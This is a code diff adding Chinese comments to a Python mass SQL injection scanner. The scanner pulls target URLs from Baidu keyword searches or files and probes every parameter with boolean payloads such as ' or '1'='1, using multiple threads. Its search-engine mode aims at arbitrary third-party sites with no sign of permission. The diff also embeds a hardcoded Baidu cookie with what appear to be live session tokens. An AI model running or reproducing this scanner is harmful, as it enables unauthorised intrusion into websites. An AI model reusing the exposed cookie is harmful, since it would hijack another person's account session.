@@ -10,8 +10,8 @@ from optparse import OptionParser
 
 class Batch_SQL_Injection_Scan():
     def __init__(self):
-        self.baidu_flag=0
-        self.pause_flag=False
+        self.baidu_flag=0#判断多关键字百度爬虫函数是否全部完成,函数运行完一个则加一
+        self.pause_flag=False#主中断flag,用于中断所有进程
         self.banner='''
     ____  ___  ______________  __    _____ ____    __         _____   __    __
    / __ )/   |/_  __/ ____/ / / /   / ___// __ \  / /        /  _/ | / /   / /
@@ -28,7 +28,7 @@ class Batch_SQL_Injection_Scan():
                                  
         '''
         self.usage="option -h/--help to get help"
-        self.sql_statement()
+        self.sql_statement()#获取sql参数
         self.url_list=[]
         self.User_Agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'
         self.Cookie='BAIDUID=E129C7314626E9E3E48EDB8849CB2D64:SL=0:NR=50:FG=1; BIDUPSID=05CB85424D39AF001BEE9F63FE3DC100; PSTM=1575649528; BD_UPN=13314752; __cfduid=d7ea233a8435758d7c6c791573c056c921575717023; BDUSS=29pZk5qT3A1UWk1SHNnQjFoTjFlUXlMTlBGYWVZVGlRWDd0bHlEQlRxUFhKWjllRVFBQUFBJCQAAAAAAAAAAAEAAADN5e3AaWFtaGFja2Vya2lkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANeYd17XmHdeZ; MCITY=-9019%3A; H_WISE_SIDS=147719_146488_109775_142018_147276_148320_147887_148194_147280_146538_148001_147722_147828_147889_146573_148524_147346_127969_147593_147238_146551_146454_145417_146652_147024_147353_146732_148186_131423_144659_142207_147528_148201_107315_146824_148299_146395_144966_145608_139883_146786_148346_147711_146054_145398_110085; ispeed_lsm=2; H_PS_PSSID=32293_1436_32357_31253_32351_32045_32116_31321_26350; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; yjs_js_security_passport=9b1515b61212865c34b0a2243eca06758ad8420f_1595754991_js; delPer=0; BD_CK_SAM=1; PSINO=1; H_PS_645EC=d2a37eote8p3z4LmxwiqgmUyhdprmkB0bkfSAvaeHzHjVP7ykFpNKPABmMU; COOKIE_SESSION=0_0_1_0_0_0_1_0_1_0_0_0_0_0_0_0_0_0_1595818596%7C1%230_0_1595818596%7C1; ZD_ENTRY=baidu; sug=3; sugstore=0; ORIGIN=0; bdime=0'
@@ -45,7 +45,7 @@ class Batch_SQL_Injection_Scan():
         self.sql_str_or_list = [["' or '1'='1","' or '1'='2"],['" or "1"="1','" or "1"="2']]
         self.sql_error_list = [[]]
 
-    def init_input(self):
+    def init_input(self):#输入获取函数
         use = "python Batch_Scan_SQL_Injection.py [option] [value]"
         parser = OptionParser(usage=use, version="%prog 3.0")
         parser.add_option("-u", "--url", dest="url", help="Please input test url")
@@ -68,14 +68,14 @@ class Batch_SQL_Injection_Scan():
         self.key_file_name = option.key_file
         self.timeout = int(option.timeout if option.timeout!=None else 2)
 
-    def main(self):
+    def main(self):#主函数
         try:
             print(self.banner)
-            self.init_input()
+            self.init_input()#获取输入参数
             print("#####################################START#####################################")
-            if self.save_file_name!=None:
+            if self.save_file_name!=None:#判断是否要保存文件
                 self.save_file = open(self.save_file_name,"a")
-            if self.url!=None:
+            if self.url!=None:#若测试参数为-u,启动单url测试模式
                 params = self.get_params(self.url)
                 if params==[]:
                     return
@@ -117,7 +117,7 @@ class Batch_SQL_Injection_Scan():
                 if self.save_file_name != None:
                     self.save_file.close()
                 return
-            if self.url_file_name!=None:
+            if self.url_file_name!=None:#若测试参数为-f,启动文件多url模式
                 url_file = open(self.url_file_name,'r')
                 self.url_list = url_file.readlines()
                 for url in self.url_list:
@@ -154,7 +154,7 @@ class Batch_SQL_Injection_Scan():
                 if self.save_file_name!=None:
                     self.save_file.close()
                 return
-            if self.baidu_key!=None:
+            if self.baidu_key!=None:#若参数为-b,启动百度单关键字爬虫测试模式
                 for i in range(self.thread_num):
                     t = threading.Thread(target=self.sql_injection)
                     t.setDaemon(True)
@@ -174,7 +174,7 @@ class Batch_SQL_Injection_Scan():
                     self.save_file.close()
                 print("######################################END######################################")
                 return
-            if self.key_file_name!=None:
+            if self.key_file_name!=None:#若测试参数为-k,启动文件多关键字百度爬虫测试模式
                 key_file = open(self.key_file_name,'r')
                 for i in range(self.thread_num):
                     t = threading.Thread(target=self.sql_injection)
@@ -211,11 +211,11 @@ class Batch_SQL_Injection_Scan():
                 self.save_file.close()
             print("Keyboard Interrupt.")
             return
-    def baidu_spider(self,key_list):
+    def baidu_spider(self,key_list):#多关键字百度爬虫模式
         for key in key_list:
             self.baidu_spider_run(key)
         self.baidu_flag+=1
-    def baidu_spider_run(self,key):
+    def baidu_spider_run(self,key):#单关键字百度爬虫模式
         for p in range(0, self.page * 50 + 1, 50):
             if self.pause_flag:
                 return
@@ -238,7 +238,7 @@ class Batch_SQL_Injection_Scan():
                     return
                 except:
                     pass
-    def get_params(self,url):
+    def get_params(self,url):#获取url中的参数,返回[[key,value]]列表
         paramq=''
         params=[]
         for i in url.split("?")[1:]:
@@ -260,7 +260,7 @@ class Batch_SQL_Injection_Scan():
         except:
             pass
         return params
-    def sql_injection(self):
+    def sql_injection(self):#sql注入主函数
         while not self.pause_flag:
             for url in self.url_list:
                 try:
@@ -304,7 +304,7 @@ class Batch_SQL_Injection_Scan():
                     if self.save_file_name != None and not self.pause_flag:
                         self.save_file.write("The parameter {} of {} has an digital type or injection.\n".format(or_inject_params, url))
                     continue
-    def str_sql_injection_run(self,url,params):
+    def str_sql_injection_run(self,url,params):#sql字符注入测试函数,返回注入成功的and与or参数[],[]下同
         try:
             tr = requests.get(url, headers=self.headers,timeout=self.timeout)
         except KeyboardInterrupt:
@@ -374,7 +374,7 @@ class Batch_SQL_Injection_Scan():
                 or_inject_params.append(param)
         return and_inject_params, or_inject_params
 
-    def num_sql_injection_run(self,url,params):
+    def num_sql_injection_run(self,url,params):#sql数字注入测试函数
         try:
             tr = requests.get(url, headers=self.headers,timeout=self.timeout)
         except KeyboardInterrupt:
